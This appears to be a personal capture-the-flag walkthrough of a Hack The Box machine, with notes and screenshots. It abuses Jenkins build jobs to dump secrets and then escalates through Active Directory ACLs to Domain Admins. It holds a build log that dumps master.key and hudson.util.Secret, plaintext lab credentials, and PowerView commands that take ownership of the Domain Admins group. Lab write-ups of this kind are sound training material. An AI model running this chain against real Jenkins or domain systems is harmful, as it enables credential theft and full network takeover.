![[Pasted image 20240604133944.png]]

initial scan

![[Pasted image 20240604134516.png]]
user ideas@object.htb


![[Pasted image 20240604134707.png]]

jenkins login lets you register an account

![[Pasted image 20240604134805.png]]

sad, no script engine for us, but we can register builds

![[Pasted image 20240604143952.png]]
make one to list the directory we're in, config looks juicy

it was actually in C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035

![[Pasted image 20240604145818.png]]
so we have an admin hash and

![[Pasted image 20240604145918.png]]
this took some tinkering, but here's my dumped secrets

```
14:22:03 Started by remote host 10.10.14.4
14:22:03 Running as SYSTEM
14:22:03 Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\cmd
14:22:03 [cmd] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins15204901719658108121.bat
14:22:03 
14:22:03 C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\cmd>type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml 
14:22:03 <?xml version='1.1' encoding='UTF-8'?>
14:22:03 <user>
14:22:03   <version>10</version>
14:22:03   <id>admin</id>
14:22:03   <fullName>admin</fullName>
14:22:03   <properties>
14:22:03     <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
14:22:03       <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
14:22:03         <entry>
14:22:03           <com.cloudbees.plugins.credentials.domains.Domain>
14:22:03             <specifications/>
14:22:03           </com.cloudbees.plugins.credentials.domains.Domain>
14:22:03           <java.util.concurrent.CopyOnWriteArrayList>
14:22:03             <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
14:22:03               <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
14:22:03               <description></description>
14:22:03               <username>oliver</username>
14:22:03               <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
14:22:03               <usernameSecret>false</usernameSecret>
14:22:03             </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
14:22:03           </java.util.concurrent.CopyOnWriteArrayList>
14:22:03         </entry>
14:22:03       </domainCredentialsMap>
14:22:03     </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
14:22:03     <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
14:22:03       <triggers/>
14:22:03     </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
14:22:03     <hudson.model.MyViewsProperty>
14:22:03       <views>
14:22:03         <hudson.model.AllView>
14:22:03           <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
14:22:03           <name>all</name>
14:22:03           <filterExecutors>false</filterExecutors>
14:22:03           <filterQueue>false</filterQueue>
14:22:03           <properties class="hudson.model.View$PropertyList"/>
14:22:03         </hudson.model.AllView>
14:22:03       </views>
14:22:03     </hudson.model.MyViewsProperty>
14:22:03     <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
14:22:03       <providerId>default</providerId>
14:22:03     </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
14:22:03     <hudson.model.PaneStatusProperties>
14:22:03       <collapsed/>
14:22:03     </hudson.model.PaneStatusProperties>
14:22:03     <jenkins.security.seed.UserSeedProperty>
14:22:03       <seed>ea75b5bd80e4763e</seed>
14:22:03     </jenkins.security.seed.UserSeedProperty>
14:22:03     <hudson.search.UserSearchProperty>
14:22:03       <insensitiveSearch>true</insensitiveSearch>
14:22:03     </hudson.search.UserSearchProperty>
14:22:03     <hudson.model.TimeZoneProperty/>
14:22:03     <hudson.security.HudsonPrivateSecurityRealm_-Details>
14:22:03       <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
14:22:03     </hudson.security.HudsonPrivateSecurityRealm_-Details>
14:22:03     <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
14:22:03       <emailAddress>admin@object.local</emailAddress>
14:22:03     </hudson.tasks.Mailer_-UserProperty>
14:22:03     <jenkins.security.ApiTokenProperty>
14:22:03       <tokenStore>
14:22:03         <tokenList/>
14:22:03       </tokenStore>
14:22:03     </jenkins.security.ApiTokenProperty>
14:22:03     <jenkins.security.LastGrantedAuthoritiesProperty>
14:22:03       <roles>
14:22:03         <string>authenticated</string>
14:22:03       </roles>
14:22:03       <timestamp>1634793332195</timestamp>
14:22:03     </jenkins.security.LastGrantedAuthoritiesProperty>
14:22:03   </properties>
14:22:03 </user>
14:22:03 C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\cmd>exit 0 
14:22:03 [cmd] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins9665734559229338931.bat
14:22:03 
14:22:03 C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\cmd>type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key 
14:22:03 f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
14:22:03 C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\cmd>exit 0 
14:22:03 [cmd] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins6543154307961785323.bat
14:22:03 
14:22:03 C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\cmd>powershell -c [convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte))  
14:22:04 gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
14:22:04 
14:22:04 C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\cmd>exit 0 
14:22:04 Finished: SUCCESS
```

Encrypted password: {AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}
Master.key: f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19

base64 encoded hudson.util.secret: gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=

![[Pasted image 20240604152900.png]]![[Pasted image 20240604152910.png]]

![[Pasted image 20240604153534.png]]
well, that was quite involved

but now we have 


oliver:c1cdfun_d2434

![[Pasted image 20240604154017.png]]
and I can even psremote <3

Okay then lets run bloodhound

!!! If you're using bloodhound (not CE) then sharphound must be pre- v2.0

![[Pasted image 20240605093946.png]]

Okay, looks like a pretty standard killchain. Let's change smith's password and log in.
![[Pasted image 20240605094106.png]]
Let's use powerview to set smiths password. Here's how I did it.

![[Pasted image 20240605094719.png]]

Awesome, now I'm smith!

![[Pasted image 20240605094803.png]]

Using genericwrite, we can steal maria's SPN Ticket

![[Pasted image 20240605103153.png]]
So this doesn't actually work and the hash isn't crackable, you actually have to read an xml file from maria's desktop
![[Pasted image 20240605105740.png]]
maria:W3llcr4ft3d_4cls works

Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria
net group "Domain Admins" maria /add
![[Pasted image 20240606143200.png]]